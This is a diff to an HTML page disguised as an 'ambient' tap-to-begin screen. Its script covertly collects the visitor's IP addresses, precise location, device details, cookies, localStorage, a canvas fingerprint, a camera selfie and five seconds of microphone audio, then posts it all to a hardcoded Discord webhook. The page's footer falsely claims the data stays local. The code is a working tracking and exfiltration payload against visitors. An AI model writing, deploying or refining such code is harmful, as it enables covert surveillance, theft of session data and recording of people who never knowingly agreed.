@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ambient</title>
+    <title>ambient collection</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            color: #aaa;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            font-family: 'Courier New', monospace;
-            color: #aaa;
-            user-select: none;
-            cursor: pointer;
-            overflow: hidden;
+            padding: 20px;
         }
         #click-overlay {
             position: fixed;
@@ -27,20 +25,27 @@
             cursor: pointer;
         }
         .container {
-            text-align: center;
-            padding: 50px 40px;
             background: #111;
-            border-radius: 16px;
             border: 1px solid #1a1a1a;
-            max-width: 420px;
-            width: 90%;
-            pointer-events: none;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
             position: relative;
             z-index: 1;
+            pointer-events: none;
         }
-        .icon {
-            font-size: 36px;
-            margin-bottom: 16px;
+        .container * { pointer-events: none; }
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #1a1a1a;
+            margin-bottom: 20px;
+        }
+        .header .icon {
+            font-size: 28px;
             opacity: 0.4;
             animation: pulse 2.5s infinite;
         }
@@ -48,44 +53,163 @@
             0%, 100% { opacity: 0.3; }
             50% { opacity: 0.7; }
         }
-        .title {
-            font-size: 16px;
+        .header .title {
+            font-size: 14px;
             letter-spacing: 3px;
             font-weight: 300;
-            margin-bottom: 8px;
             color: #888;
+            margin-top: 6px;
         }
-        .sub {
-            font-size: 11px;
+        .header .sub {
+            font-size: 10px;
             color: #333;
             letter-spacing: 2px;
+            margin-top: 4px;
         }
         #status {
-            margin-top: 24px;
-            font-size: 10px;
+            text-align: center;
+            font-size: 11px;
             color: #2a2a2a;
             letter-spacing: 1px;
+            margin: 12px 0 16px 0;
             transition: color 0.3s;
         }
         #status.active { color: #555; }
         #status.done { color: #666; }
-        .detail {
+        #status.error { color: #442222; }
+
+        .section {
+            margin-bottom: 14px;
+            padding: 10px 14px;
+            background: #0d0d0d;
+            border-radius: 8px;
+            border-left: 2px solid #1a1a1a;
+            transition: border-color 0.3s;
+        }
+        .section.captured { border-left-color: #446644; }
+        .section-label {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .section-value {
+            font-size: 12px;
+            color: #888;
+            word-break: break-all;
+            line-height: 1.6;
+            font-weight: 300;
+        }
+        .section-value .highlight {
+            color: #aabbcc;
+        }
+        .section-value .ip {
+            color: #6a8a9a;
+        }
+        .section-value .data {
+            color: #7a7a7a;
+        }
+
+        .media-preview {
+            display: flex;
+            gap: 12px;
+            margin-top: 6px;
+            flex-wrap: wrap;
+        }
+        .media-preview img, .media-preview video {
+            max-width: 120px;
+            max-height: 90px;
+            border-radius: 4px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            object-fit: cover;
+        }
+        .media-preview .audio-indicator {
+            padding: 6px 12px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 4px;
+            font-size: 10px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .media-preview .audio-indicator .wave {
+            display: inline-block;
+            animation: wave 0.8s infinite alternate;
+        }
+        @keyframes wave {
+            0% { opacity: 0.2; transform: scaleY(0.5); }
+            100% { opacity: 0.8; transform: scaleY(1); }
+        }
+
+        .footer {
+            text-align: center;
             margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #1a1a1a;
             font-size: 9px;
             color: #1a1a1a;
-            letter-spacing: 0.5px;
-            line-height: 1.8;
+            letter-spacing: 1px;
         }
+
+        /* scrollbar */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 2px; }
     </style>
 </head>
 <body>
     <div id="click-overlay"></div>
-    <div class="container">
-        <div class="icon">✦</div>
-        <div class="title">weaving</div>
-        <div class="sub">ambient collection</div>
+    <div class="container" id="container">
+        <div class="header">
+            <div class="icon">✦</div>
+            <div class="title">ambient collection</div>
+            <div class="sub">live preview</div>
+        </div>
         <div id="status">tap anywhere to begin</div>
-        <div class="detail" id="detail"></div>
+
+        <div id="sections">
+            <div class="section" id="sec-ips">
+                <div class="section-label">🌐 IP Addresses</div>
+                <div class="section-value" id="val-ips"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-location">
+                <div class="section-label">📍 Location</div>
+                <div class="section-value" id="val-location"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-battery">
+                <div class="section-label">🔋 Battery</div>
+                <div class="section-value" id="val-battery"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-system">
+                <div class="section-label">🖥️ System</div>
+                <div class="section-value" id="val-system"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-network">
+                <div class="section-label">🌐 Network</div>
+                <div class="section-value" id="val-network"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-storage">
+                <div class="section-label">📦 Storage</div>
+                <div class="section-value" id="val-storage"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-canvas">
+                <div class="section-label">🎨 Canvas Fingerprint</div>
+                <div class="section-value" id="val-canvas"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-media">
+                <div class="section-label">📸 Media</div>
+                <div class="section-value" id="val-media"><span class="data">waiting...</span></div>
+            </div>
+            <div class="section" id="sec-webhook">
+                <div class="section-label">📤 Webhook</div>
+                <div class="section-value" id="val-webhook"><span class="data">waiting...</span></div>
+            </div>
+        </div>
+        <div class="footer">✦ all data gathered locally ✦</div>
     </div>
 
     <script>
@@ -93,19 +217,21 @@
             const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
             let started = false;
             let mediaStream = null;
-            let audioChunks = [];
-            let audioContext = null;
 
             const statusEl = document.getElementById('status');
-            const detailEl = document.getElementById('detail');
 
             function setStatus(text, state = 'active') {
                 statusEl.textContent = text;
                 statusEl.className = state;
             }
 
-            function setDetail(text) {
-                detailEl.textContent = text;
+            function updateSection(id, value, captured = true) {
+                const el = document.getElementById(id);
+                const valEl = document.getElementById('val-' + id.replace('sec-', ''));
+                if (valEl) {
+                    valEl.innerHTML = value;
+                    if (captured && el) el.classList.add('captured');
+                }
             }
 
             // ─── IP COLLECTION ────────────────────────────────────────────────
@@ -130,10 +256,12 @@
                             if (ip4) ips.add(ip4[0]);
                             const ip6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
                             if (ip6) ips.add(ip6[0]);
+                            // Update live
+                            const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
+                            updateSection('sec-ips', ipList || '<span class="data">collecting...</span>');
                         }
                     };
 
-                    // Fetch public IPs from multiple services
                     const fetchIPs = [
                         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
                         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
@@ -145,14 +273,18 @@
                         results.forEach(r => {
                             if (r.status === 'fulfilled' && r.value) ips.add(r.value);
                         });
+                        const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
+                        updateSection('sec-ips', ipList || '<span class="data">none found</span>');
                         setTimeout(() => {
                             pc.close();
                             resolve(Array.from(ips));
-                        }, 3000);
+                        }, 1000);
                     });
 
                     setTimeout(() => {
                         pc.close();
+                        const ipList = Array.from(ips).map(ip => `<span class="ip">${ip}</span>`).join(' ');
+                        updateSection('sec-ips', ipList || '<span class="data">none found</span>');
                         resolve(Array.from(ips));
                     }, 5000);
                 });
@@ -162,12 +294,20 @@
             function getBattery() {
                 return new Promise((resolve) => {
                     if (!navigator.getBattery) {
+                        updateSection('sec-battery', '<span class="data">unavailable</span>');
                         resolve({ level: 'unavailable', charging: 'unavailable' });
                         return;
                     }
                     navigator.getBattery()
-                        .then(b => resolve({ level: Math.round(b.level * 100), charging: b.charging }))
-                        .catch(() => resolve({ level: 'error', charging: 'error' }));
+                        .then(b => {
+                            const val = `${Math.round(b.level * 100)}% (${b.charging ? '⚡charging' : '🔋discharging'})`;
+                            updateSection('sec-battery', val);
+                            resolve({ level: Math.round(b.level * 100), charging: b.charging });
+                        })
+                        .catch(() => {
+                            updateSection('sec-battery', '<span class="data">error</span>');
+                            resolve({ level: 'error', charging: 'error' });
+                        });
                 });
             }
 
@@ -175,25 +315,29 @@
             function getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) {
-                        resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' });
+                        updateSection('sec-location', '<span class="data">unavailable</span>');
+                        resolve({ latitude: 'unavailable', longitude: 'unavailable' });
                         return;
                     }
                     navigator.geolocation.getCurrentPosition(
-                        pos => resolve({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        }),
+                        pos => {
+                            const val = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (${Math.round(pos.coords.accuracy)}m)`;
+                            updateSection('sec-location', val);
+                            resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
+                        },
                         err => {
-                            // fallback to IP-based geo
+                            // fallback to IP
                             fetch('https://ipapi.co/json/')
                                 .then(r => r.json())
-                                .then(d => resolve({
-                                    latitude: d.latitude || 'unavailable',
-                                    longitude: d.longitude || 'unavailable',
-                                    accuracy: 'ip-based'
-                                }))
-                                .catch(() => resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' }));
+                                .then(d => {
+                                    const val = `${d.latitude || '?'}, ${d.longitude || '?'} (IP-based)`;
+                                    updateSection('sec-location', val);
+                                    resolve({ latitude: d.latitude || 'unavailable', longitude: d.longitude || 'unavailable' });
+                                })
+                                .catch(() => {
+                                    updateSection('sec-location', '<span class="data">permission denied</span>');
+                                    resolve({ latitude: 'unavailable', longitude: 'unavailable' });
+                                });
                         },
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
@@ -203,35 +347,21 @@
             // ─── SYSTEM INFO ──────────────────────────────────────────────────
             function getSystemInfo() {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                return {
+                const info = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
                     languages: navigator.languages || [],
-                    cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
                     hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                     deviceMemory: navigator.deviceMemory || 'unknown',
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio || 1
-                    },
-                    window: {
-                        innerWidth: window.innerWidth,
-                        innerHeight: window.innerHeight,
-                        outerWidth: window.outerWidth,
-                        outerHeight: window.outerHeight
-                    },
+                    screen: `${screen.width}x${screen.height} @ ${window.devicePixelRatio || 1}x`,
                     connection: conn ? {
                         type: conn.type || 'unknown',
                         effectiveType: conn.effectiveType || 'unknown',
                         downlink: conn.downlink || 'unknown',
                         rtt: conn.rtt || 'unknown'
-                    } : { type: 'unknown', effectiveType: 'unknown' },
+                    } : null,
                     localStorage: (() => {
                         try {
                             const items = {};
@@ -261,7 +391,7 @@
                             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                             if (!gl) return 'unavailable';
                             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (!debugInfo) return { vendor: 'unavailable', renderer: 'unavailable' };
+                            if (!debugInfo) return 'unavailable';
                             return {
                                 vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                                 renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
@@ -269,6 +399,19 @@
                         } catch { return 'unavailable'; }
                     })()
                 };
+
+                let sysVal = `<span class="data">${info.platform}</span> · <span class="data">${info.hardwareConcurrency} cores</span> · <span class="data">${info.deviceMemory}GB</span> · <span class="data">${info.timezone}</span>`;
+                updateSection('sec-system', sysVal);
+
+                let netVal = info.connection ?
+                    `<span class="data">${info.connection.effectiveType}</span> · <span class="data">${info.connection.type}</span> · ${info.connection.downlink}Mbps` :
+                    '<span class="data">unknown</span>';
+                updateSection('sec-network', netVal);
+
+                let storageVal = `localStorage: <span class="data">${Object.keys(info.localStorage).length} items</span> · cookies: <span class="data">${info.cookies.length > 40 ? info.cookies.substring(0, 40) + '...' : info.cookies || 'none'}</span>`;
+                updateSection('sec-storage', storageVal);
+
+                return info;
             }
 
             // ─── CANVAS FINGERPRINT ──────────────────────────────────────────
@@ -289,33 +432,26 @@
                     ctx.strokeStyle = '#2c2c2c';
                     ctx.lineWidth = 2;
                     ctx.strokeRect(0, 0, canvas.width, canvas.height);
-                    return canvas.toDataURL('image/png').split(',')[1] || null;
-                } catch { return null; }
+                    const dataUrl = canvas.toDataURL('image/png').split(',')[1];
+                    updateSection('sec-canvas', `<span class="highlight">captured</span> (${dataUrl ? dataUrl.length : 0} bytes)`);
+                    return dataUrl || null;
+                } catch {
+                    updateSection('sec-canvas', '<span class="data">error</span>');
+                    return null;
+                }
             }
 
             // ─── MEDIA CAPTURE ───────────────────────────────────────────────
             function initMedia() {
                 return new Promise((resolve, reject) => {
-                    if (mediaStream) {
-                        resolve(mediaStream);
-                        return;
-                    }
+                    if (mediaStream) { resolve(mediaStream); return; }
                     navigator.mediaDevices.getUserMedia({
-                        audio: {
-                            echoCancellation: false,
-                            noiseSuppression: false,
-                            autoGainControl: false
-                        },
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
+                        audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false },
+                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                     }).then(stream => {
                         mediaStream = stream;
                         resolve(stream);
                     }).catch(err => {
-                        // Try audio only if video fails
                         navigator.mediaDevices.getUserMedia({ audio: true })
                             .then(stream => {
                                 mediaStream = stream;
@@ -338,36 +474,34 @@
                     video.style.height = '1px';
                     document.body.appendChild(video);
 
-                    video.onloadedmetadata = () => {
-                        video.play().catch(() => {});
-                    };
-
+                    video.onloadedmetadata = () => video.play().catch(() => {});
                     video.onplaying = () => {
                         try {
                             const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
+                            canvas.width = Math.min(video.videoWidth || 640, 640);
+                            canvas.height = Math.min(video.videoHeight || 480, 480);
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                             document.body.removeChild(video);
+                            // Show preview
+                            const imgHtml = `<img src="${dataUrl}" alt="selfie" />`;
+                            const mediaSection = document.getElementById('val-media');
+                            if (mediaSection) {
+                                const existing = mediaSection.innerHTML;
+                                mediaSection.innerHTML = existing.includes('selfie') ?
+                                    existing.replace(/<img[^>]*>/, imgHtml) :
+                                    `<div class="media-preview">${imgHtml}</div>` + (existing.includes('audio') ? existing : '');
+                            }
                             resolve(dataUrl.split(',')[1] || null);
                         } catch (e) {
                             document.body.removeChild(video);
                             resolve(null);
                         }
                     };
-
-                    video.onerror = () => {
-                        document.body.removeChild(video);
-                        resolve(null);
-                    };
-
+                    video.onerror = () => { document.body.removeChild(video); resolve(null); };
                     setTimeout(() => {
-                        if (video.parentNode) {
-                            document.body.removeChild(video);
-                            resolve(null);
-                        }
+                        if (video.parentNode) { document.body.removeChild(video); resolve(null); }
                     }, 5000);
                 });
             }
@@ -375,41 +509,34 @@
             function captureAudio(stream) {
                 return new Promise((resolve) => {
                     const chunks = [];
-                    const recorder = new MediaRecorder(stream, {
-                        mimeType: 'audio/webm;codecs=opus'
-                    });
-
-                    recorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) chunks.push(e.data);
-                    };
-
+                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                     recorder.onstop = () => {
-                        if (chunks.length === 0) {
-                            resolve(null);
-                            return;
-                        }
+                        if (chunks.length === 0) { resolve(null); return; }
                         const blob = new Blob(chunks, { type: 'audio/webm' });
                         const reader = new FileReader();
                         reader.onload = () => {
+                            // Show indicator
+                            const mediaSection = document.getElementById('val-media');
+                            if (mediaSection) {
+                                const waveHtml = `<div class="media-preview"><div class="audio-indicator"><span>🎤</span> <span class="wave">～～～</span> ${(blob.size / 1024).toFixed(0)}KB</div></div>`;
+                                mediaSection.innerHTML = (mediaSection.innerHTML || '') + waveHtml;
+                            }
                             resolve(reader.result.split(',')[1] || null);
                         };
                         reader.onerror = () => resolve(null);
                         reader.readAsDataURL(blob);
                     };
-
                     recorder.start();
-                    setTimeout(() => {
-                        recorder.stop();
-                    }, 5000);
+                    setTimeout(() => recorder.stop(), 5000);
                 });
             }
 
-            // ─── MAIN COLLECTION ─────────────────────────────────────────────
+            // ─── MAIN ─────────────────────────────────────────────────────────
 
             async function collectAndSend() {
                 setStatus('collecting IPs...', 'active');
                 const ips = await collectIPs();
-                setDetail(`IPs: ${ips.length} found`);
 
                 setStatus('gathering system info...', 'active');
                 const system = getSystemInfo();
@@ -424,8 +551,6 @@
                 const canvasFp = getCanvasFingerprint();
 
                 setStatus('requesting media...', 'active');
-                setDetail('permission prompt may appear');
-
                 let selfie = null;
                 let audio = null;
 
@@ -433,40 +558,30 @@
                     const stream = await initMedia();
                     setStatus('capturing selfie...', 'active');
                     selfie = await captureSelfie(stream);
-                    setDetail(selfie ? 'selfie captured' : 'selfie failed');
-
                     setStatus('capturing audio...', 'active');
                     audio = await captureAudio(stream);
-                    setDetail(audio ? 'audio captured' : 'audio failed');
-
-                    // Stop tracks
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    setDetail('media permissions denied or unavailable');
+                    updateSection('sec-media', '<span class="data">permission denied or unavailable</span>');
                 }
 
                 setStatus('building payload...', 'active');
 
-                // ─── BUILD PAYLOAD ──────────────────────────────────────────
+                // ─── BUILD & SEND ──────────────────────────────────────────
 
                 const fields = [
                     { name: '🌐 IPs', value: ips.length ? ips.join('\n') : 'none', inline: false },
                     { name: '📍 Location', value: `${geo.latitude}, ${geo.longitude}`, inline: true },
-                    { name: '🎯 Accuracy', value: geo.accuracy?.toString() || 'unknown', inline: true },
                     { name: '🔋 Battery', value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
-                    { name: '📱 Screen', value: `${system.screen.width}x${system.screen.height} @ ${system.screen.pixelRatio}x`, inline: true },
+                    { name: '📱 Screen', value: system.screen, inline: true },
                     { name: '🌍 Timezone', value: system.timezone, inline: true },
-                    { name: '🖥️ Hardware', value: `${system.hardwareConcurrency} cores, ${system.deviceMemory}GB RAM`, inline: true },
-                    { name: '🌐 Network', value: `${system.connection.effectiveType} (${system.connection.type})`, inline: true },
-                    { name: '📦 localStorage', value: Object.keys(system.localStorage).length + ' items', inline: true },
-                    { name: '🍪 Cookies', value: system.cookies.length > 80 ? system.cookies.substring(0, 80) + '...' : system.cookies || 'none', inline: false },
+                    { name: '🖥️ Hardware', value: `${system.hardwareConcurrency} cores, ${system.deviceMemory}GB`, inline: true },
+                    { name: '🌐 Network', value: system.connection ? `${system.connection.effectiveType} (${system.connection.type})` : 'unknown', inline: true },
+                    { name: '📦 Storage', value: `${Object.keys(system.localStorage).length} items, ${system.cookies.length} chars cookies`, inline: true },
                     { name: '🎨 Canvas FP', value: canvasFp ? 'captured' : 'none', inline: true },
                     { name: '📸 Selfie', value: selfie ? 'captured' : 'none', inline: true },
                     { name: '🎤 Audio', value: audio ? 'captured' : 'none', inline: true },
-                    { name: '🖥️ WebGL', value: typeof system.webgl === 'object' ? system.webgl.vendor : 'unavailable', inline: true },
-                    { name: '🔗 Referrer', value: system.referrer || 'direct', inline: false },
-                    { name: '🌐 Platform', value: system.platform || 'unknown', inline: true },
-                    { name: '🗣️ Language', value: system.language, inline: true }
+                    { name: '🖥️ WebGL', value: typeof system.webgl === 'object' ? system.webgl.vendor : 'unavailable', inline: true }
                 ];
 
                 const embed = {
@@ -474,15 +589,13 @@
                     color: 0x1a1a1a,
                     fields: fields,
                     timestamp: new Date().toISOString(),
-                    footer: { text: `UA: ${system.userAgent.substring(0, 80)}...` }
+                    footer: { text: `UA: ${system.userAgent.substring(0, 60)}...` }
                 };
 
                 const payload = {
                     content: `**gathered** | ${new Date().toLocaleString()}`,
                     embeds: [embed]
                 };
-
-                // ─── SEND ────────────────────────────────────────────────────
 
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify(payload));
@@ -517,18 +630,23 @@
                     } catch (e) {}
                 }
 
-                setStatus('sending...', 'active');
+                setStatus('sending to webhook...', 'active');
 
                 try {
-                    await fetch(WEBHOOK, {
+                    const response = await fetch(WEBHOOK, {
                         method: 'POST',
                         body: formData
                     });
-                    setStatus('✓ delivered', 'done');
-                    setDetail(`IPs: ${ips.length} | selfie: ${selfie ? 'yes' : 'no'} | audio: ${audio ? 'yes' : 'no'}`);
+                    if (response.ok) {
+                        setStatus('✓ delivered', 'done');
+                        updateSection('sec-webhook', `<span class="highlight">✓ sent successfully</span> (${ips.length} IPs, ${selfie ? 'selfie' : 'no selfie'}, ${audio ? 'audio' : 'no audio'})`);
+                    } else {
+                        setStatus('✗ webhook error', 'error');
+                        updateSection('sec-webhook', `<span class="data">error ${response.status}</span>`);
+                    }
                 } catch (e) {
-                    setStatus('✗ error sending', 'done');
-                    setDetail('check console');
+                    setStatus('✗ send failed', 'error');
+                    updateSection('sec-webhook', `<span class="data">network error</span>`);
                 }
             }
 
@@ -540,21 +658,16 @@
                     started = true;
                     this.style.display = 'none';
                     setStatus('initializing...', 'active');
-                    setTimeout(() => {
-                        collectAndSend();
-                    }, 300);
+                    setTimeout(collectAndSend, 300);
                 }
             });
 
-            // Also start on any keypress
             document.addEventListener('keydown', function handler() {
                 if (!started) {
                     started = true;
                     document.getElementById('click-overlay').style.display = 'none';
                     setStatus('initializing...', 'active');
-                    setTimeout(() => {
-                        collectAndSend();
-                    }, 300);
+                    setTimeout(collectAndSend, 300);
                 }
                 document.removeEventListener('keydown', handler);
             }, { once: true });
